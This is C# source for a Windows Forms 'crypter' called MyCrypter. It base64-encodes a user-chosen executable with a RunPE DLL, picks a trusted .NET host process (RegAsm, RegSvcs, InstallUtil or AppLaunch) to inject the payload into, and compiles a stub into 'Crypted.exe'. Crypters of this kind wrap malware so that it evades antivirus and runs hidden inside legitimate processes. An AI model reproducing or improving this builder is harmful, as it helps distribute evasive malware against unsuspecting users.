using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace MyCrypter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Filter = "Executable File | *.exe";
            if (OFD.ShowDialog() == DialogResult.OK)
            {
                txtFile.Text = OFD.FileName;
            }
        }

        private void btnCrypt_Click(object sender, EventArgs e)
        {
            if (txtFile.Text.Length > 0)
            {
                string PayloadBase64 = Convert.ToBase64String(File.ReadAllBytes(txtFile.Text));
                string RunpeToBase64 = Convert.ToBase64String(File.ReadAllBytes("Runpe.dll"));
                string InjectionProcess = string.Empty;

                if (rbRegAsm.Checked == true)
                {
                    InjectionProcess = "RegAsm.exe";
                }
                else if (rbRegSvcs.Checked == true)
                {
                    InjectionProcess = "RegSvcs.exe";
                }
                else if (rbInstallUtil.Checked == true)
                {
                    InjectionProcess = "InstallUtil.exe";
                }
                else if (rbAppLaunch.Checked == true)
                {
                    InjectionProcess = "AppLaunch.exe";
                }

                SaveFileDialog SFD = new SaveFileDialog();
                SFD.Filter = "Executable File | *.exe";
                SFD.FileName = "Crypted.exe";
                if (SFD.ShowDialog() == DialogResult.OK)
                {
                    string SourceCode = Properties.Resources.Stub.Replace("%RUNPE%", RunpeToBase64).Replace("%PAYLOAD%", PayloadBase64).Replace("%PROCESS%", InjectionProcess);
                    Compiler.CodeDom(SourceCode, SFD.FileName);
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
